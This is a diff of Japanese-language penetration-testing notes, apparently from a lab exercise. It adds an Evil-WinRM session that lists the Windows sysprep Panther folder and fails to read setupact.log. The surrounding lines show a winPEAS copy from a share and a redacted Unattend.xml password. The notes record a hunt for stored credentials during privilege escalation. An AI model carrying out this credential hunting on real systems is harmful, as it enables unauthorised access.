@@ -55,6 +55,9 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 
 ### ユーザー
 
+```
+```
+
 
 ---
 
@@ -295,8 +298,30 @@ d-----         10/9/2024  12:33 PM                WUModels
     C:\Windows\Panther\Unattend.xml
 <Password>*SENSITIVE*DATA*DELETED*</Password>					</LocalAccount>				</LocalAccounts>			</UserAccounts>			<AutoLogon>				<Username>Admin</Username>				<Enabled>true</Enabled>				<LogonCount>1</LogonCount>				<Password>*SENSITIVE*DATA*DELETED*</Password>
 
+```
+
+```powershell*Evil-WinRM* PS C:\Windows\System32\sysprep\Panther> ls
 
 
+    Directory: C:\Windows\System32\sysprep\Panther
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        11/11/2024  10:49 AM          44919 diagerr.xml
+-a----        11/11/2024  10:49 AM          20661 diagwrn.xml
+-a----        11/11/2024  10:49 AM          56399 setupact.log
+-a----         10/9/2024   3:49 PM          11253 setuperr.log
+
+
+*Evil-WinRM* PS C:\Windows\System32\sysprep\Panther> cat setupact.log
+Access to the path 'C:\Windows\System32\sysprep\Panther\setupact.log' is denied.
+At line:1 char:1
++ cat setupact.log
++ ~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Windows\Syst...er\setupact.log:String) [Get-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+*Evil-WinRM* PS C:\Windows\System32\sysprep\Panther> cd C:\
 ```
 
 #### Snaffler　-> 失敗
